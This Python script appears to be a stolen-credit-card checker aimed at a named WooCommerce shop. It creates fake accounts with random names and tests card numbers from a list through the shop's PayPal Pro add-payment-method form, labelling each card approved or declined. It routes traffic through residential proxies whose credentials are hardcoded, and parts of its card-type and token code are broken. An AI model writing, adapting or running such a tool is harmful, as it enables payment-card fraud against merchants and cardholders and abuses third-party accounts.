import base64
import random
import uuid
import names
from bs4 import BeautifulSoup
from requests import Session
from dataclasses import dataclass




def cut_str(text: str, a: str, b: str) -> str:
    try:
        return text.split(a)[1].split(b)[0]
    except IndexError:
        print(f"Error: No se pudo cortar la cadena entre '{a}' y '{b}'")
        return None

class ConfigsPAge:
    @classmethod
    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id
    
    def QueryText(self, data:str=None, chainOne:str=None, chainTwo:str=None):

        try:               return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
        except ValueError: return None 
    
    def DecodeBear(self, dato:str = None):
        self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
        self.bear_end = ConfigsPAge().cu(self._tokenEncoding, '"authorizationFingerprint":"', '","')

        return self.bear_end

    @classmethod
    def RandomName(self, dato: str = None):
        if dato == 'username':
            self.username = "{}{}{}".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000, 9999999)
            )
            return self.username
        elif dato == 'email':
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000, 9999999)
            )
            return self.email
        elif dato == 'password':
            self.password = "{}{}#{}".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000, 9999999)
            )
            return self.password
        elif dato == 'numero':
            self.number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
            return self.number
        else:
            return 'Valores incorrectos: >>>   ConfigsPAge().RandomName("username")'

    def SaveResponseHtml(self, response: str):
        try:
            with open("ResponseHtml.html", "w", encoding="utf-8") as f:
                f.write(response)
        except Exception as e:
            print(f"Error guardando el archivo: {e}")
@dataclass
class payflowCCNMR:
    def main(self, card):
        #try:
            max_retries = 3
            self.UseMail = ConfigsPAge().RandomName('email')
            
            cc = card.split("|")
            if cc[0] == '4':cctype = 'Visa'
            elif cc[0] == '5':cctype = 'MasterCard'
            elif cc[0] == '6':cctype = 'Amex'
            elif cc[0] == '6':cctype = 'Discover'

            self.session = Session()
            self.session.proxies.update({'http': "http://f880b05d3961fd7b:1Dpwz5cmSVkqJT3Y@res.proxy-seller.com:10000",'https': "http://112c3b382c0a58e5:3oRFh1gfvEzUxn4m@res.proxy-seller.com:10000"})
            
            
        
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-ES,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://www.polarbear-weatherproofing.com/en/','sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',}
            r1 = self.session.get('https://www.polarbear-weatherproofing.com/en/my-account/',  headers=headers)
            nonce_register = cut_str(r1.text,'name="woocommerce-register-nonce" value="','"')

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-ES,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.polarbear-weatherproofing.com','priority': 'u=0, i','referer': 'https://www.polarbear-weatherproofing.com/en/my-account/','sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',}
            data = {'email': self.UseMail,'mailchimp_woocommerce_gdpr[d0ea7487c9]': '0','mailchimp_woocommerce_gdpr[1995d25e60]': '0','wc_order_attribution_source_type': 'typein','wc_order_attribution_referrer': '(none)','wc_order_attribution_utm_campaign': '(none)','wc_order_attribution_utm_source': '(direct)','wc_order_attribution_utm_medium': '(none)','wc_order_attribution_utm_content': '(none)','wc_order_attribution_utm_id': '(none)','wc_order_attribution_utm_term': '(none)','wc_order_attribution_utm_source_platform': '(none)','wc_order_attribution_utm_creative_format': '(none)','wc_order_attribution_utm_marketing_tactic': '(none)','wc_order_attribution_session_entry': 'https://www.polarbear-weatherproofing.com/en/cart/','wc_order_attribution_session_start_time': '2025-12-27 18:57:38','wc_order_attribution_session_pages': '19','wc_order_attribution_session_count': '1','wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36','woocommerce-register-nonce': nonce_register,'_wp_http_referer': '/en/my-account/','register': 'Register',}
            r2 = self.session.post('https://www.polarbear-weatherproofing.com/en/my-account/', headers=headers, data=data)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-ES,es;q=0.9','priority': 'u=0, i','referer': 'https://www.polarbear-weatherproofing.com/en/my-account/payment-methods/','sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',}
            r3 = self.session.get('https://www.polarbear-weatherproofing.com/en/my-account/add-payment-method/',headers=headers,)
            payment_nonce = cut_str(r3.text,'name="woocommerce-add-payment-method-nonce" value="','"')
    
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-ES,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.polarbear-weatherproofing.com','priority': 'u=0, i','referer': 'https://www.polarbear-weatherproofing.com/en/my-account/add-payment-method/','sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',}
            data = {'payment_method': 'paypal_pro','paypal_pro-card-number': cc[0],'paypal_pro-card_expiration_month': cc[1],'paypal_pro-card_expiration_year': cc[2],'paypal_pro-card-cvc': cc[3],'woocommerce-add-payment-method-nonce': payment_nonce,'_wp_http_referer': '/en/my-account/add-payment-method/','woocommerce_add_payment_method': '1',}
            r4 = self.session.post('https://www.polarbear-weatherproofing.com/en/my-account/add-payment-method/', headers=headers, data=data,)
            self.session.close()

            if 'Payment method successfully added.' in r4.text:
                return 'Approved! ✅','Charged $0.01'

            elif '15004 - This transaction cannot be processed. Please enter a valid Credit Card Verification Number.' in r4.text:
                return 'Approved! ✅', 'CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.'
            else:
                navi = r4.text 
                soup = BeautifulSoup(navi, 'html.parser')
                error_ul = soup.find('ul', class_='woocommerce-error')

            if error_ul:
                error_message = error_ul.find('li').get_text(strip=True)
                return 'Declined! ❌', error_message
            else:
                return 'Declined! ❌', 'err'

        #except: return 'Declined! ❌','Declined - This transaction cannot be processed'
            
""""datos = """

"""

for dato in datos.strip().splitlines():
    print(payflowCCNMR().main(dato))"""